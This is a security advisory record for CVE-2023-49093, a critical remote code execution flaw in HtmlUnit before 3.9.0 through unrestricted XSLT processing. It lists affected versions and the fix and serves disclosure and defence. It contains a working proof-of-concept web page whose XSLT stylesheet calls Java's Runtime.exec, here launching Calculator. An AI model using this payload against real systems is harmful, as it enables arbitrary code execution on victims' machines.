advisory_id: GHSA-37vq-hr2f-g7h7
datasource_id: github_osv_importer_v2/GHSA-37vq-hr2f-g7h7
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-37vq-hr2f-g7h7/GHSA-37vq-hr2f-g7h7.json
aliases:
  - CVE-2023-49093
summary: |
  HtmlUnit vulnerable to Remote Code Execution (RCE) via XSTL
  ### Summary
  HtmlUnit 3.8.0 are vulnerable to Remote Code Execution (RCE) via XSTL, when browsing the attackerâ€™s webpage

  ### Details
  Vulnerability code location:
  org.htmlunit.activex.javascript.msxml.XSLProcessor#transform(org.htmlunit.activex.javascript.msxml.XMLDOMNode)

  The reason for the vulnerability is that it was not enabled FEATURE_SECURE_PROCESSING for the XSLT processor

  ### PoC
  pom.xml:
  ```
  <dependency>
    <groupId>org.htmlunit</groupId>
    <artifactId>htmlunit</artifactId>
    <version>3.8.0</version>
  </dependency>
  ```

  code:
  ```
  WebClient webClient = new WebClient(BrowserVersion.INTERNET_EXPLORER);
  HtmlPage page = webClient.getPage("http://127.0.0.1:8080/test.html");
  System.out.println(page.asNormalizedText());
  ```

  test.html:
  ```
  <script>
      var xslt = new ActiveXObject("Msxml2.XSLTemplate.6.0");
      var xslDoc = new ActiveXObject("Msxml2.FreeThreadedDOMDocument.6.0");
      var xslProc;
      xslDoc.async = false;
      xslDoc.loadXML(`<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
     <xsl:template match="/">
       <xsl:variable name="rtobject" select="rt:getRuntime()"/>
       <xsl:variable name="process" select="rt:exec($rtobject,'open -a Calculator')"/>
       <xsl:variable name="processString" select="ob:toString($process)"/>
       <span><xsl:value-of select="$processString"/></span>
     </xsl:template>
   </xsl:stylesheet>`)

      if (xslDoc.parseError.errorCode != 0) {
          var myErr = xslDoc.parseError;
          document.write("ParseError: "+myErr.reason);
      } else {
          xslt.stylesheet = xslDoc;
          var xmlDoc = new ActiveXObject("Msxml2.DOMDocument.6.0");
          xmlDoc.async = false;
          xmlDoc.loadXML("<s></s>");
          if (xmlDoc.parseError.errorCode != 0) {
              var myErr = xmlDoc.parseError;
              document.write("Document error: " + myErr.reason);
          } else {
              xslProc = xslt.createProcessor();
              xslProc.input = xmlDoc;
              xslProc.transform();
              document.write(xslProc.output);
          }
      }
  </script>
  ```


  ### Impact
  Remote Code Execution
impacted_packages:
  - purl: pkg:maven/org.htmlunit/htmlunit
    affected_versions: vers:maven/<3.9.0
    fixed_versions: vers:maven/3.9.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/12/GHSA-37vq-hr2f-g7h7/GHSA-37vq-hr2f-g7h7.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-94
references:
  - url: https://github.com/HtmlUnit/htmlunit
    reference_type:
    reference_id:
  - url: https://github.com/HtmlUnit/htmlunit/security/advisories/GHSA-37vq-hr2f-g7h7
    reference_type:
    reference_id:
  - url: https://www.htmlunit.org/changes-report.html#a3.9.0
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-49093
    reference_type:
    reference_id: CVE-2023-49093
